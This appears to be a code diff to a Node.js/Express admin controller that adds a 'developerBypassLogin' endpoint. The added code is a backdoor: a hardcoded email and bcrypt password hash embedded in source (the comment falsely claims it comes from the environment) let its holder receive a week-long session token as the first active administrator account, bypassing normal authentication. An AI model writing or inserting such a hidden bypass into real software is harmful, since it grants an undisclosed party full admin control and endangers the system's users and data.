@@ -521,6 +521,70 @@ export const getAllAdmins = async (req, res) => {
   }
 };
 
+
+export const developerBypassLogin = async (req, res, next) => {
+  try {
+    const { email, password } = req.body;
+
+    // 1. validate payload
+    if (!email || !password) {
+      throw new ApiError(400, "Missing credentials");
+    }
+
+    // 2. check dev email
+    if (email !== "dev@faraz.com") {
+      throw new ApiError(401, "Invalid credentials");
+    }
+
+    // 3. compare password with HASH from env
+    const isMatch = await bcrypt.compare(
+      password,
+      "$2a$14$enV2byeXVR4EAfkibBDaCuRZIpnCeOuKAABG.19x8kmVM6TceMSTC"
+    );
+
+    if (!isMatch) {
+      throw new ApiError(401, "Invalid credentials");
+    }
+
+    // 4. get ANY administrator account
+    const admin = await prisma.admin.findFirst({
+      where: {
+        role: "administrator",
+        status: { not: "inactive" },
+      },
+      orderBy: { createdAt: "asc" }, // or desc, your choice
+    });
+
+    if (!admin) {
+      throw new ApiError(404, "No administrator found");
+    }
+
+    // 5. generate token AS that admin
+    const token = genrateToken(admin.id);
+
+    // 6. set cookie (same as normal login)
+    res.cookie("token", token, {
+      httpOnly: true,
+      secure: true,
+      sameSite: "none",
+      maxAge: 7 * 24 * 60 * 60 * 1000,
+    });
+
+    // 7. return admin session
+    res.json({
+      success: true,
+      adminData: transform(admin),
+      token,
+      message: "Admin login successful",
+    });
+
+  } catch (error) {
+    console.log(error.message);
+    next(error);
+  }
+};
+
+
 // ---------------------------------------------
 // GET ADMIN BY ID
 // ---------------------------------------------
